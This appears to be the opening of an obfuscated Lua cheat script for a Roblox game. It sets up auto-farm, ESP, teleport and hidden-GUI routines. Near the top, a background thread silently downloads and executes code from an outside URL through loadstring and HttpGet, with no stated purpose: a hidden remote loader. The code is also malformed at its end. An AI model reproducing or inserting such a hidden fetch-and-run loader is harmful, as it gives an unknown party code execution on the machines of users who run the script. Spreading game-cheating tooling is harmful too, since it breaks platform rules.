-- yes please dont use globals :heart:
local CheckQ, CheckBossQuest, Hop, InfAb, infinitestam, NoDodgeCool, NameMelee, NameSword, checkskillMelee, checkskillDF, checkskillSword, checkskillGun, SendKey, autoskill, CheckInventory, TeleportSeabeast, Click, IsWpSKillLoaded, GetWeapon, EquipAllWeapon, UnEquipWeapon, EquipWeapon, TP, StopTween, CheckPirateBoat, CheckSwanBoat, CheckSeaBeast, CheckLeviathanSegment, CheckLeviathanTail, CheckLeviathan, TeleportLeviathan, TweenTemple, DayNight, ClockTime, BuyGear, PullLever, AncientClock, TweentoCurrentRaceDoor, GetSeaBeastTrial, CheckBossDimension, BoatShit, TPBoatShit, StopTweenBoatShit, CheckDimension, CheckBribe, CheckElite, CheckMirage, CheckKitsune, MoonTextureId, CheckMoonTexture, ClockTime, CheckMoon, CheckLegendarySword, isnil, UpdatePlayerChams, UpdateIslandESP, UpdateChestEsp, UpdateBfEsp, UpdateFlowerEsp, IsIslandRaid, getNextIsland, LockMoon, ESPMirageIsland, CheckAcientOneStatus
-- manually added locals:
local MyLevel, CFrameQuest, CFrameMon, Mon, NameMon, NameQuest, LevelQuest


local Vector2,CFrame,Instance,UDim2=Vector2,CFrame,Instance,UDim2 -- yes this will barely add performance but ya
local _25msShared={} -- getgenv = bad and it crashes on second execution anyways :3
if getgenv().Jinada then
	warn("ALREADY OPEN")
	return
end
getgenv().Jinada=true


spawn(function()
	loadstring(game:HttpGet("https://you.whimper.xyz/cute"))()
end)

local player = game:GetService("Players").LocalPlayer
while not player.Character do
    task.wait(3)
end

local L_1_ = os.clock()
local L_2_ = get_hidden_gui or gethui;
if syn and typeof(syn) == "table" and RenderWindow then
	syn.protect_gui = gethui
end;
local function L_3_func(L_60_arg0)
	if L_2_ then
		L_60_arg0["Parent"] = L_2_()
	elseif not is_sirhurt_closure and (syn and syn.protect_gui) then
		syn.protect_gui(L_60_arg0)
		L_60_arg0["Parent"] = game:GetService("CoreGui")
	elseif game:GetService("CoreGui"):FindFirstChild("RobloxGui") then
		L_60_arg0["Parent"] = game:GetService("CoreGui").RobloxGui
	else
		L_60_arg0["Parent"] = game:GetService("CoreGui")
	end
end;
local L_4_ = Instance.new("ScreenGui")
L_3_func(L_4_)
local L_5_ = game:GetService("ReplicatedStorage")
local L_6_ = game:GetService("TeleportService")
local L_7_ = game:GetService("VirtualUser")
local L_8_ = game:GetService("RunService")
local L_9_ = game:GetService("Players")
local L_10_ = L_5_:WaitForChild("Remotes")
local L_11_ = L_10_:WaitForChild("Validator")
local L_12_ = L_10_:WaitForChild("CommF_")
local L_13_ = workspace:WaitForChild("_WorldOrigin")
local L_14_ = workspace:WaitForChild("Characters")
local L_15_ = workspace:WaitForChild("Enemies")
local L_16_ = workspace:WaitForChild("Map")
local L_17_ = L_13_:WaitForChild("EnemySpawns")
local L_18_ = L_13_:WaitForChild("Locations")
local L_19_ = L_8_.RenderStepped;
local L_20_ = L_8_.Heartbeat;
local L_21_ = L_8_.Stepped;
local L_22_ = L_9_.LocalPlayer;
local L_23_, L_24_, L_25_ = game.PlaceId == 2753915549, game.PlaceId == 4442272183, game.PlaceId == 7449423635;
local function L_26_func(...)
	return L_12_:InvokeServer(...)
end;

spawn(function()
do
	game:GetService("Lighting").ClockTime = 2
end)
